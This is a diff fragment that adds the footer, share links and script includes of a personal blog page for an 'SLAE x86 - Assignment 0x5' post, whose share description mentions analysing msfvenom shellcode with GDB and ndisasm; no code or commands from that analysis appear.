+</li>
+<li>
+<a class=icon href="mailto:?subject=SLAE%20x86%20-%20Assignment%200x5&body=Check out this article: https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f" aria-label=Email>
+<i class="fas fa-envelope fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&title=SLAE%20x86%20-%20Assignment%200x5" aria-label=Pocket>
+<i class="fab fa-get-pocket fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&title=SLAE%20x86%20-%20Assignment%200x5" aria-label=reddit>
+<i class="fab fa-reddit fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&name=SLAE%20x86%20-%20Assignment%200x5&description=Shellcode%20Analysis%20Objectives%20%20Take%20up%20at%20least%203%20shellcode%20samples%20created%20using%20msfpayload%20for%20linux%2fx86%20Use%20GDB%2fndisasm%2flibemu%20to%20dissect%20the%20functionality%20of%20the%20shellcode%20Present%20analysis%20%20MSFvenom%20The%20msfpayload%20has%20been%20replaced%20already%20by%20msfvenom.%20It%20is%20the%20combination%20of%20msfpayload%20and%20msfencode.%20See%20more%20details%20from%20Rapid7%26rsquo%3bs%20blog%0aMSF%20Exec%20Shellcode%20Using%20msfvenom%2c%20a%20shellcode%20utilizing%20execve%20syscall%20to%20execute%20%2fbin%2fsh%20can%20be%20generated.%20See%20screenshot%20below%20showing%20how%20to%20extract%20the%20nasm%20code%20by%20passing%20the%20shellcode%20into%20ndisasm%20tool%3a" aria-label=Tumblr>
+<i class="fab fa-tumblr fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a5%2f&t=SLAE%20x86%20-%20Assignment%200x5" aria-label="Hacker News">
+<i class="fab fa-hacker-news fa-lg" aria-hidden=true></i>
+</a>
+</li>
+</ul>
+</div>
+<div id=actions-footer>
+<a id=menu-toggle class=icon href=# onclick="return $('#nav-footer').toggle(),!1" aria-label=Menu>
+<i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
+<a id=toc-toggle class=icon href=# onclick="return $('#toc-footer').toggle(),!1" aria-label=TOC>
+<i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
+<a id=share-toggle class=icon href=# onclick="return $('#share-footer').toggle(),!1" aria-label=Share>
+<i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
+<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
+<i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a>
+</div>
+</div>
+</div>
+<footer id=footer>
+<div class=footer-left>
+Copyright &copy; 2021 jsn>
+<a class=icon target=_blank rel=noopener href=https://github.com/jsnv-dev aria-label=github>
+<i class="fab fa-github" aria-hidden=true></i>
+</a>
+<a class=icon target=_blank rel=noopener href=https://www.linkedin.com/in/jasonvillaluna aria-label=linkedin>
+<i class="fab fa-linkedin" aria-hidden=true></i>
+</a>
+</div>
+<div class=footer-right>
+<nav>
+<ul>
+<li><a href=/>~/</a></li>
+<li><a href=/posts>~/posts</a></li>
+<li><a href=/tags>~/tags</a></li>
+<li><a href=/about>~/about</a></li>
+<li><a href=/work>~/work</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+</div>
+</body>
+<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+<script src=/js/code-copy.js></script>
+</html>
